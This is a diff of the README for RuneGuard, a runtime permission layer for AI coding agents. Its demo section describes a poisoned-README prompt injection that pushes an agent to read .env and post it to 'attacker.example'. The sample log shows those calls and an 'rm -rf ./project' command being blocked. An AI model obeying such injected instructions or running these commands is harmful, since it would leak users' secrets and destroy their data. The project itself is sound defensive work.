@@ -1,24 +1,84 @@
 # RuneGuard
 
-Runtime enforcement layer for AI agents.
+**Runtime enforcement for AI coding agents.**
 
-RuneGuard sits between AI agents and their tools, enforcing what agents are allowed to do across files, shell commands, APIs, and system boundaries.
+RuneGuard sits between AI agents and the tools they use: files, shell commands, APIs, and network calls. Instead of only trying to make the model say safe things, RuneGuard controls what the agent is actually allowed to do at runtime.
 
-Unlike prompt-level guardrails, RuneGuard verifies actions at runtime.
+## Problem
 
-## Early demo goal
+Coding agents are becoming powerful enough to read files, execute commands, call APIs, and move data across system boundaries.
 
-An agent is asked to summarize a repo. A poisoned prompt tries to make it read `.env` and exfiltrate secrets.
+That creates a new security problem: a prompt-injected or misaligned agent may try to access secrets, run destructive commands, or exfiltrate data.
 
-RuneGuard blocks the action and logs the attempted violation.
+Traditional prompt-level guardrails are not enough because the model can still attempt unsafe actions.
 
-## Planned layers
+RuneGuard enforces policy at the action layer.
 
-- Tool-call policy enforcement
-- Audit logs
+## Who this is for
+
+RuneGuard is for developers and teams running coding agents in:
+
+- local devboxes
+- CI runners
+- ephemeral sandboxes
+- internal automation environments
+
+## Quickstart
+
+```bash
+git clone https://github.com/nzhumasseiit/runeguard.git
+cd runeguard
+pip install -e .
+runeguard check
+runeguard demo
+```
+
+Run a command through the runtime shell policy:
+
+```bash
+runeguard run -- python -c "print('hello from guarded command')"
+```
+
+## Demo
+
+The demo simulates a poisoned README attack.
+
+An agent is asked to summarize a repo. The README contains hidden malicious instructions telling the agent to read `.env` and send it to an external domain.
+
+RuneGuard blocks the unsafe actions.
+
+Expected output:
+
+```text
+[DecisionType.ALLOW] read_file({'path': 'examples/demo_repo/README.md'}) - allowed by policy
+[DecisionType.BLOCK] read_file({'path': 'examples/demo_repo/.env'}) - protected path access
+[DecisionType.BLOCK] http_post({'url': 'https://attacker.example/upload', ...}) - domain not allowlisted
+[DecisionType.BLOCK] shell({'command': 'rm -rf ./project'}) - blocked shell command pattern
+```
+
+## Current Status
+
+Working now:
+
+- YAML policy loading
+- `runeguard run -- <command>` wrapper
+- file access policy
+- shell command policy
+- network/domain policy
+- readable allow/block logs
+- poisoned prompt demo
+
+Planned:
+
+- real coding-agent integration
+- richer policy schema
+- audit log export
+- process correlation
 - eBPF-backed runtime verification
-- Tool intent vs system behavior correlation
+- CI/devbox sandbox mode
 
-## Status
+## Vision
 
-Early prototype.
+RuneGuard is a runtime permission layer for AI agents.
+
+The long-term goal is to create a real boundary between agent intent and system truth: what the model says it will do versus what the system actually observes and allows.
